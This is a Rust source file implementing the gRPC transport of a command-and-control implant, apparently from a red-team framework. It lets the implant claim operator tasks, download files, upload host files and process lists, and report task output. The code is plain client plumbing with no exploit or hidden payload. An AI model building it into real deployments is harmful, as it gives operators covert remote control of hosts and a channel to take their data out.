use crate::pb::{
    ClaimTasksRequest, ClaimTasksResponse, DownloadFileRequest, DownloadFileResponse,
    ReportFileRequest, ReportFileResponse, ReportProcessListRequest, ReportProcessListResponse,
    ReportTaskOutputRequest, ReportTaskOutputResponse,
};
use anyhow::Result;
use async_trait::async_trait;
use std::sync::mpsc::{Receiver, Sender};
use tonic::codec::ProstCodec;
use tonic::GrpcMethod;
use tonic::Request;

static CLAIM_TASKS_PATH: &str = "/c2.C2/ClaimTasks";
static DOWNLOAD_FILE_PATH: &str = "/c2.C2/DownloadFile";
static REPORT_FILE_PATH: &str = "/c2.C2/ReportFile";
static REPORT_PROCESS_LIST_PATH: &str = "/c2.C2/ReportProcessList";
static REPORT_TASK_OUTPUT_PATH: &str = "/c2.C2/ReportTaskOutput";

#[derive(Debug, Clone)]
pub struct GRPC {
    grpc: tonic::client::Grpc<tonic::transport::Channel>,
}

#[async_trait]
impl crate::Transport for GRPC {
    async fn claim_tasks(
        &mut self,
        request: crate::pb::ClaimTasksRequest,
    ) -> Result<crate::pb::ClaimTasksResponse> {
        let resp = self.claim_tasks_impl(request).await?;
        Ok(resp.into_inner())
    }

    async fn download_file(
        &mut self,
        request: crate::pb::DownloadFileRequest,
        sender: Sender<crate::pb::DownloadFileResponse>,
    ) -> Result<()> {
        let resp = self.download_file_impl(request).await?;
        let mut stream = resp.into_inner();
        while let Some(file_chunk) = stream.message().await? {
            sender.send(file_chunk)?;
        }
        Ok(())
    }

    async fn report_file(
        &mut self,
        request: Receiver<crate::pb::ReportFileRequest>,
    ) -> Result<crate::pb::ReportFileResponse> {
        let stream = tokio_stream::iter(request);
        let tonic_req = Request::new(stream);
        let resp = self.report_file_impl(tonic_req).await?;
        Ok(resp.into_inner())
    }

    async fn report_process_list(
        &mut self,
        request: crate::pb::ReportProcessListRequest,
    ) -> Result<crate::pb::ReportProcessListResponse> {
        let resp = self.report_process_list_impl(request).await?;
        Ok(resp.into_inner())
    }

    async fn report_task_output(
        &mut self,
        request: crate::pb::ReportTaskOutputRequest,
    ) -> Result<crate::pb::ReportTaskOutputResponse> {
        let resp = self.report_task_output_impl(request).await?;
        Ok(resp.into_inner())
    }
}

impl GRPC {
    pub async fn new(callback: String) -> Result<Self, tonic::transport::Error> {
        let endpoint = tonic::transport::Endpoint::from_shared(callback)?;
        let channel = endpoint.connect().await?;
        let grpc = tonic::client::Grpc::new(channel);
        Ok(Self { grpc })
    }

    ///
    /// Contact the server for new tasks to execute.
    pub async fn claim_tasks_impl(
        &mut self,
        request: impl tonic::IntoRequest<crate::pb::ClaimTasksRequest>,
    ) -> std::result::Result<tonic::Response<ClaimTasksResponse>, tonic::Status> {
        self.grpc.ready().await.map_err(|e| {
            tonic::Status::new(
                tonic::Code::Unknown,
                format!("Service was not ready: {}", e),
            )
        })?;
        let codec: ProstCodec<ClaimTasksRequest, ClaimTasksResponse> =
            tonic::codec::ProstCodec::default();

        let path = tonic::codegen::http::uri::PathAndQuery::from_static(CLAIM_TASKS_PATH);
        let mut req = request.into_request();
        req.extensions_mut()
            .insert(GrpcMethod::new("c2.C2", "ClaimTasks"));
        self.grpc.unary(req, path, codec).await
    }

    ///
    /// Download a file from the server, returning one or more chunks of data.
    /// The maximum size of these chunks is determined by the server.
    /// The server should reply with two headers:
    ///   - "sha3-256-checksum": A SHA3-256 digest of the entire file contents.
    ///   - "file-size": The number of bytes contained by the file.
    ///
    /// If no associated file can be found, a NotFound status error is returned.
    pub async fn download_file_impl(
        &mut self,
        request: impl tonic::IntoRequest<DownloadFileRequest>,
    ) -> std::result::Result<
        tonic::Response<tonic::codec::Streaming<DownloadFileResponse>>,
        tonic::Status,
    > {
        self.grpc.ready().await.map_err(|e| {
            tonic::Status::new(
                tonic::Code::Unknown,
                format!("Service was not ready: {}", e),
            )
        })?;
        let codec: ProstCodec<DownloadFileRequest, DownloadFileResponse> =
            tonic::codec::ProstCodec::default();
        let path = tonic::codegen::http::uri::PathAndQuery::from_static(DOWNLOAD_FILE_PATH);
        let mut req = request.into_request();
        req.extensions_mut()
            .insert(GrpcMethod::new("c2.C2", "DownloadFile"));
        self.grpc.server_streaming(req, path, codec).await
    }

    ///
    /// Report a file from the host to the server.
    /// Providing content of the file is optional. If content is provided:
    ///   - Hash will automatically be calculated and the provided hash will be ignored.
    ///   - Size will automatically be calculated and the provided size will be ignored.
    /// Content is provided as chunks, the size of which are up to the agent to define (based on memory constraints).
    /// Any existing files at the provided path for the host are replaced.
    pub async fn report_file_impl(
        &mut self,
        request: impl tonic::IntoStreamingRequest<Message = ReportFileRequest>,
    ) -> std::result::Result<tonic::Response<ReportFileResponse>, tonic::Status> {
        self.grpc.ready().await.map_err(|e| {
            tonic::Status::new(
                tonic::Code::Unknown,
                format!("Service was not ready: {}", e),
            )
        })?;
        let codec: ProstCodec<ReportFileRequest, ReportFileResponse> =
            tonic::codec::ProstCodec::default();
        let path = tonic::codegen::http::uri::PathAndQuery::from_static(REPORT_FILE_PATH);
        let mut req = request.into_streaming_request();
        req.extensions_mut()
            .insert(GrpcMethod::new("c2.C2", "ReportFile"));
        self.grpc.client_streaming(req, path, codec).await
    }

    ///
    /// Report the active list of running processes. This list will replace any previously reported
    /// lists for the same host.
    pub async fn report_process_list_impl(
        &mut self,
        request: impl tonic::IntoRequest<ReportProcessListRequest>,
    ) -> std::result::Result<tonic::Response<ReportProcessListResponse>, tonic::Status> {
        self.grpc.ready().await.map_err(|e| {
            tonic::Status::new(
                tonic::Code::Unknown,
                format!("Service was not ready: {}", e),
            )
        })?;
        let codec: ProstCodec<ReportProcessListRequest, ReportProcessListResponse> =
            tonic::codec::ProstCodec::default();
        let path = tonic::codegen::http::uri::PathAndQuery::from_static(REPORT_PROCESS_LIST_PATH);
        let mut req = request.into_request();
        req.extensions_mut()
            .insert(GrpcMethod::new("c2.C2", "ReportProcessList"));
        self.grpc.unary(req, path, codec).await
    }

    ///
    /// Report execution output for a task.
    pub async fn report_task_output_impl(
        &mut self,
        request: impl tonic::IntoRequest<ReportTaskOutputRequest>,
    ) -> std::result::Result<tonic::Response<ReportTaskOutputResponse>, tonic::Status> {
        self.grpc.ready().await.map_err(|e| {
            tonic::Status::new(
                tonic::Code::Unknown,
                format!("Service was not ready: {}", e),
            )
        })?;
        let codec: ProstCodec<ReportTaskOutputRequest, ReportTaskOutputResponse> =
            tonic::codec::ProstCodec::default();
        let path = tonic::codegen::http::uri::PathAndQuery::from_static(REPORT_TASK_OUTPUT_PATH);
        let mut req = request.into_request();
        req.extensions_mut()
            .insert(GrpcMethod::new("c2.C2", "ReportTaskOutput"));
        self.grpc.unary(req, path, codec).await
    }
}
